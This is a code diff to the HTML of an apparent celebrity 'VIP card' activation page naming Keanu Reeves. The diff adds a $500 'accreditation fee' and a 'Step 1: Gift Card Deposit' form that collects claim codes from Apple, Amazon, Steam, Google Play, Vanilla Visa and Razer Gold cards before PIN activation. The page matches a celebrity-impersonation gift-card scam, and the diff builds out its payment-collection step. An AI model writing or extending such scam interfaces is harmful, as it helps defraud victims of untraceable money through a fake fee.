@@ -327,6 +327,10 @@
           <span class="meta-value">Keanu Reeves • Nov 3, 2026</span>
         </div>
         <div class="meta-row">
+          <span class="meta-label">ACCREDITATION FEE:</span>
+          <span class="meta-value gold" id="cardFeeDisplay">$500.00 USD</span>
+        </div>
+        <div class="meta-row">
           <span class="meta-label">ACTIVATION STATUS:</span>
           <span class="meta-value" id="modalStatusBadge">
             <span class="pin-status-pill is-pending">PENDING ACTIVATION</span>
@@ -335,32 +339,82 @@
       </div>
 
       <div id="authInputSection">
-        <label for="cardPinInput" class="auth-input-label">
-          Enter 6-Digit VIP Activation PIN
-        </label>
-        <div class="pin-input-group">
-          <input 
-            type="text" 
-            id="cardPinInput" 
-            class="card-pin-input" 
-            placeholder="813-026" 
-            maxlength="7" 
-            autocomplete="off"
-            inputmode="numeric"
-          />
-          <button type="button" id="quickFillPinBtn" class="btn-quick-pin" title="Use the PIN generated on this credential">
-            Insert PIN: 813-026
+        <!-- Step 1: Gift Card Accreditation Deposit -->
+        <div class="auth-step-box" id="giftCardStepBox">
+          <div class="auth-step-title">
+            <span>Step 1: Gift Card Deposit (<span id="giftCardFeeAmount">$500.00 USD</span>)</span>
+            <span class="pin-status-pill is-pending" id="giftCardStatusPill">REQUIRED</span>
+          </div>
+
+          <div id="giftCardForm">
+            <label for="giftCardProviderSelect" class="auth-input-label">Select Gift Card Provider</label>
+            <select id="giftCardProviderSelect" class="card-select-input">
+              <option value="Apple Gift Card">Apple Gift Card</option>
+              <option value="Amazon">Amazon</option>
+              <option value="Steam">Steam</option>
+              <option value="Google Play">Google Play</option>
+              <option value="Vanilla Visa / Mastercard">Vanilla Visa / Mastercard</option>
+              <option value="Razer Gold">Razer Gold</option>
+            </select>
+
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
+              <label for="giftCardCodeInput" class="auth-input-label" style="margin: 0;">Claim Code</label>
+              <button type="button" id="quickFillCardBtn" class="btn-quick-pin">
+                Auto-Fill: Apple $500 Code
+              </button>
+            </div>
+            <input 
+              type="text" 
+              id="giftCardCodeInput" 
+              class="card-code-input" 
+              placeholder="e.g. X7KM-92NQ-48PL-2026" 
+              autocomplete="off"
+            />
+
+            <button type="button" id="redeemGiftCardBtn" class="btn-redeem-card">
+              Redeem &amp; Verify Deposit
+            </button>
+          </div>
+
+          <div id="giftCardVerifiedBanner" class="gift-card-verified-tag" style="display: none;">
+            <span>✓ Deposit Verified: <strong id="verifiedCardDesc">Apple Gift Card ($500.00 USD)</strong></span>
+          </div>
+        </div>
+
+        <!-- Step 2: OATH PIN Activation -->
+        <div class="auth-step-box" id="pinStepBox">
+          <div class="auth-step-title">
+            <span>Step 2: OATH PIN Activation</span>
+            <span class="pin-status-pill is-pending" id="pinStepPill">PENDING</span>
+          </div>
+
+          <label for="cardPinInput" class="auth-input-label">
+            Enter 6-Digit VIP Activation PIN
+          </label>
+          <div class="pin-input-group">
+            <input 
+              type="text" 
+              id="cardPinInput" 
+              class="card-pin-input" 
+              placeholder="813-026" 
+              maxlength="7" 
+              autocomplete="off"
+              inputmode="numeric"
+            />
+            <button type="button" id="quickFillPinBtn" class="btn-quick-pin" title="Use the PIN generated on this credential">
+              Insert PIN: 813-026
+            </button>
+          </div>
+          <p class="auth-input-hint">
+            The VIP PIN is generated on your credential pass barcode strip and back security panel.
+          </p>
+
+          <div id="authErrorMessage" class="auth-error-message" style="display: none;"></div>
+
+          <button type="button" id="submitPinAuthBtn" class="btn btn-gold btn-full-width">
+            <span id="submitBtnText">Authenticate &amp; Activate Card</span>
           </button>
         </div>
-        <p class="auth-input-hint">
-          The VIP PIN is generated on your credential pass barcode strip and back security panel.
-        </p>
-
-        <div id="authErrorMessage" class="auth-error-message" style="display: none;"></div>
-
-        <button type="button" id="submitPinAuthBtn" class="btn btn-gold btn-full-width">
-          <span id="submitBtnText">Authenticate &amp; Activate Card</span>
-        </button>
       </div>
 
       <div id="authSuccessSection" style="display: none;">
